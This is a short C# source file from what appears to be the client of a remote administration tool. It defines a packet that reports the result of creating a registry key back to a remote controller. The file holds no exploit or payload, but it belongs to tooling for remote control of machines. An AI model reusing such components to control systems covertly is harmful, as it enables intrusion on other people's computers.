using System;
using xClient.Core.Networking;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetCreateRegistryKeyResponse : IPacket
{
	public string ParentPath { get; set; }

	public RegSeekerMatch Match { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
